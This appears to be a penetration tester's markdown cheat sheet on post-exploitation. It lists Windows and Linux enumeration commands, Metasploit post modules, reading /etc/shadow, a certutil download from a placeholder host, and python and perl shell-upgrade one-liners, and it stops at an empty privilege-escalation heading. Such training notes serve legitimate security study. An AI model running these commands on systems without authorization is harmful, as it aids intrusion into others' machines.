# Overview
Once you [Exploit](Exploitation.md) and gain access to a system then you need to do local enumeration and data gathering as well as seeing if you can gain higher privilege and if possible pivot to more networks in the organization.

## Post-Exploitation Methodology
1. [Local Enumeration](#Local_Enumeration)
2. [Transferring Files](#Transferring_Files)
3. [Upgrading Shells](#Upgrading_Shells)
4. [Privilege Escalation](#Privilege_Escalation)
5. Persistence
6. Dumping and Cracking Hashes
7. Pivoting
8. Clearing Your Tracks

---

# Local_Enumeration
We are looking for
- system information
	- Hostname
	- OS Name and build
		- patches/packs
		- kernel/distribution
	- OS architecture
	- Applications/Packages
- Users & Privileges
	- who is admins
	- Groups
- networking information
	- routing tables
	- firewall state
	- tcp/udp services
- Processes & Services
	- Scheduled tasks

### Windows
- meterpreter
	- `getuid`
	- `sysinfo`
	- `getprivs`
	- `route`
	- `arp`
	- `ps`
	- `pgrep explorer.exe`
	- `show_mount` : show drives
- MSF Modules
	- `use post/windows/gather/enum_logged_on_users`
	- `use post/windows/gather/win_privs`
	- `use post/windows/gather/checkvm`
	- `use post/windows/gather/enumapplications`
	- `use post/windows/gather/enum_computers` : useful for on domain
	- `use post/windows/gather/enum_patches`
	- `use post/windows/gather/enum_shares`
- shell commands
	- `hostname`
	- `systeminfo`
	- `wmic gfe get Caption,Description,HotFixId,InstalledOn`
		- information about security updates and install date
	- `C:\Windows\System32\eula.txt` : system information on some versions
	- `whoami`
	- `whoami /priv` show enabled privileges
	- `query user` : show logged on users
	- `net users` : show users accounts
	- `net user administrator` : show information on user
	- `net localgroup` : groups on the system
	- `net localgroup Administrators` : information on group
	- `ipconfig /all` 
	- `route print` : routing table information
	- `arp -a` : display arp table
	- `netstat -ano` : display listening services
	- `netsh firewall show state` or 
	- `netsh advfirewall`
	- `netsh advfirewall firewall show` : show firewall state
	- `net start` : show started services
	- `wmic service list brief` : running services info
	- `tasklist /SVC` : processes running w/ PID & service
	- `schtasks /query /fo LIST -v` : schedule task detailed info
- Automated Powershell Script
	- https://github.com/411Hall/JAWS
	- upload to `C:\Temp`
	- `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`

### Linux
- meterpreter
	- `sysinfo`
	- `getuid`
	- `ifconfig`
	- `netstat`
	- `route`
	- `arp`
	- `ps`
- MSF Modules
	- `use post/linux/gather/enum_configs`
	- `use post/linux/gather/enum_network`
	- `use post/linux/gather/enum_system`
	- `use post/linux/gather/checkvm`
- Shell Commands
	- `hostname`
	- `uname -a`
	- `cat /etc/issue` & `cat /etc/*release`
	- `env` : user environment variables
	- `lscpu` : cpu info
	- `df -h` : show data files
	- `lsblk` : list block devices
	- Use package manager to list installed packages
		- `dpkg -l` : Debian package manager
		- `dnf list installed`
		- `rpm -qa` : RedHat package manager
		- `pacman -Q` : Arch
		- `zypper se --installed-only` : OpenSUSE
		- `equery list '*'` : Gentoo
	- `/etc/passwd` : user file
	- `/etc/group` : groups file
	- `/etc/shadow` : passwords file
	- `last` & `lastlog` : last loggin
	- `lastb` : last bad login
	- `ifconfig` or `ip add s`
	- `/etc/hosts` : host file
	- `/etc/resolv.conf`
	- `lsof -iPn` : list open files that are tcp/udp
	- `ps aux` : process info
	- `crontab -l` : list crontab for current user
	- `ls -al /etc/cron*` : crontab files
- Automation Script
	- https://github.com/rebootuser/LinEnum
	- upload to `/temp`
	- add execute permissions and run, output to file

---

# Transferring_Files
- Python Web Server
	- `python -m SimpleHTTPServer 80` : python2 module
	- `python3 -m HTTP.server 80` : python3
- Windows - Download
	- `certutil -urlcache -f http://host/file.exe file.exe`
- Linux - Download
	- `curl`
	- `wget `

---

# Upgrading_Shells
- Non-interactive shell session
	- `/bin/bash -i` : launches bash interactive
	- `cat /etc/shells` to view available shells
	- `python --version` : see if python is available
		- `python -c 'import pty; pty.spawn("/bin/bash")'` : spawn bash
	- `perl -e 'exec "/bin/bash";'`
		- `perl -e 'system("/bin/bash");'`
	- can lookup different languages
- `env` check shell environment, add variables if not existing
	- `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
	- `export TERM-xterm`
	- `export SHELL=bash`

---

# Privilege_Escalation
